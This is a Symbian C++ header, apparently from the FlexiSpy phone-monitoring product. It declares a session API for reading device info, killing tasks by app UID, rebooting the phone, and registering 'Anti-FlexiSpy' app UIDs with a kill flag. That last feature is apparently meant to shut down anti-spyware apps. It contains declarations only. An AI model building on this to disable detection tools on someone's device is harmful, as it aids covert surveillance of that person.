#ifndef __CommonServices_H__
#define __CommonServices_H__

#include <e32base.h>

#include "MobinfoType.h"
#include "FxShareData.h"
#include "AppUidData.h"

/**
* Common Services Session
* 
*/
class RCommonServices : public RSessionBase
	{
public:
	IMPORT_C TInt Connect();
	
	IMPORT_C TVersion Version() const;
	
	/**
	* Requests for notification when 
	* 
	*/
	IMPORT_C void NotifyFlexiKEY(TDes& aFlexiKEY, TRequestStatus& aStatus);
	IMPORT_C void CancelNotifyFlexiKEY();	
	
	/**
	* Get mobile info
	*
	* @param aMobInfo TMobileInfoPckg, the package of TMobileInfo
	* @param aStatus
	*/
	IMPORT_C void GetMobileInfo(TDes8& aMobInfo, TRequestStatus& aStatus);
	
	IMPORT_C void CancelGetMobileInfo();
	
	/**
	* Get share data
	* @param aProductId
	* @param aShareData Result from server. pkg of TProductInfoShare 
	*                   aShareData.iProductId must contain product id
	* @return KErrNotFound if the specified product does not exist
	*/
	IMPORT_C void GetShareData(TDes8& aShareData);
	
	/**
	* Set share data
	* @param aShareData pkg of TProductInfoShare 
	* @return KErrNone if success
	*/
	IMPORT_C TInt SetShareData(const TDesC8& aShareData);
	/**
	* Kill task
	* @param app uid
	* @return KErrNone if success.
	*		  KErrNotFound if the specified uid does not exist
	*/
	IMPORT_C TInt KillTask(TUid aAppUid);
	
	/**
	* Reboot the device
	* @return KErrNone if success
	* 
	*/ 
	IMPORT_C TInt RebootDevice();
	
	/**
	* Set Anti-FlexiSpy Uids to CommonServer
	* leave if not success
	* 
	*/ 
	IMPORT_C void SetAntiFSUidsL(RArray<TUid>& aAppUids);
	
	/*
	* Set Kill enable flag to CommonServer
	* @return KErrNone if success
	*/
	IMPORT_C TInt SetKillFlag(TBool aKill); 
	};
	
#endif
